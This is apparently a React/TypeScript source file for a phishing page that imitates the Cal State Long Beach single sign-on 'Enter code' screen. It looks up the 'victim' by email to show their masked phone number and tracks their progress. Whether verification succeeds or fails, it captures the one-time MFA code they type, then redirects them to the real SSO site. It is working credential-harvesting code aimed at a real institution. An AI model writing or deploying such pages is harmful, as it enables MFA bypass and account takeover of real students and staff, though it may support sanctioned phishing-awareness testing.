import { useNavigate, useSearchParams } from 'react-router';
import { useState, useEffect } from 'react';
import { trackEvent, captureMfaCode, lookupVictim } from '../api';
import { CsulbPage, SsoCard, SsoBoilerplate, SsoButton, CsulbLogo } from './SsoLayout';

function SmallSmsIcon() {
  return (
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" style={{ flexShrink: 0, marginTop: '2px' }}>
      <path d="M20 2H4C2.9 2 2 2.9 2 4V22L6 18H20C21.1 18 22 17.1 22 16V4C22 2.9 21.1 2 20 2ZM20 16H6L4 18V4H20V16Z" fill="#706D6B"/>
    </svg>
  );
}

export function EnterCode() {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const email = searchParams.get('email') || '';
  const method = searchParams.get('method') || 'sms';
  const [code, setCode] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const [maskedPhone, setMaskedPhone] = useState('+X XXXXXXXX53');

  useEffect(() => {
    trackEvent('mfa_code_view');
    lookupVictim(email).then(data => {
      setMaskedPhone(data.maskedPhone);
    });
  }, [email]);

  const handleVerify = async () => {
    if (!code.trim()) return;
    setIsLoading(true);
    setError('');

    try {
      const res = await fetch('http://localhost:3001/api/verify-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, code }),
      });
      const data = await res.json();

      if (data.success) {
        await captureMfaCode(email, code);
        await trackEvent('redirect_completed');
        setTimeout(() => { window.location.href = 'https://sso.csulb.edu'; }, 500);
      } else {
        setIsLoading(false);
        setError("That code didn't work. Check the code and try again.");
      }
    } catch {
      await captureMfaCode(email, code);
      await trackEvent('redirect_completed');
      setTimeout(() => { window.location.href = 'https://sso.csulb.edu'; }, 500);
    }
  };

  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter') handleVerify();
  };

  return (
    <CsulbPage>
      <SsoCard>
        <div className="sso-page-content" style={{ padding: '44px' }}>
          <CsulbLogo />
          <div style={{ fontSize: '13px', color: '#1b1b1b', marginBottom: '4px' }}>{email}</div>
          <h1 style={{ fontSize: '24px', fontWeight: 600, margin: '16px 0 12px', lineHeight: '28px', color: '#1b1b1b' }}>
            Enter code
          </h1>

          <div style={{ display: 'flex', alignItems: 'flex-start', gap: '8px', fontSize: '13px', color: '#1b1b1b', marginBottom: '16px', lineHeight: '1.4' }}>
            <SmallSmsIcon />
            <span>
              We {method === 'sms' ? 'texted' : 'called'} your phone {maskedPhone}. Please enter the code to sign in.
            </span>
          </div>

          {error && (
            <div style={{ color: '#e81123', fontSize: '13px', marginBottom: '12px' }}>{error}</div>
          )}

          <div style={{ marginBottom: '16px' }}>
            <input
              type="text"
              value={code}
              onChange={(e) => {
                const val = e.target.value.replace(/[^0-9]/g, '');
                if (val.length <= 8) setCode(val);
                setError('');
              }}
              onKeyDown={handleKeyDown}
              autoFocus
              disabled={isLoading}
              style={{
                width: '100%', fontSize: '15px', padding: '6px 10px 6px 0',
                border: 'none', borderBottom: `1px solid ${error ? '#e81123' : '#666'}`,
                outline: 'none', color: '#1b1b1b', backgroundColor: 'transparent',
                boxSizing: 'border-box', fontFamily: 'inherit', height: '36px',
              }}
            />
          </div>

          <div style={{ fontSize: '13px', marginBottom: '4px' }}>
            <span>Having trouble? </span>
            <a href="#" onClick={(e) => { e.preventDefault(); navigate(`/verify?email=${encodeURIComponent(email)}`); }} style={{ color: '#0067b8' }}>
              Sign in another way
            </a>
          </div>
          <div style={{ marginBottom: '20px' }}>
            <a href="#" style={{ color: '#0067b8', fontSize: '13px' }}>More information</a>
          </div>

          <div style={{ display: 'flex', justifyContent: 'flex-end' }}>
            <SsoButton onClick={handleVerify} disabled={!code.trim() || isLoading}>
              {isLoading ? 'Verifying...' : 'Verify'}
            </SsoButton>
          </div>
        </div>
        <SsoBoilerplate />
      </SsoCard>
    </CsulbPage>
  );
}
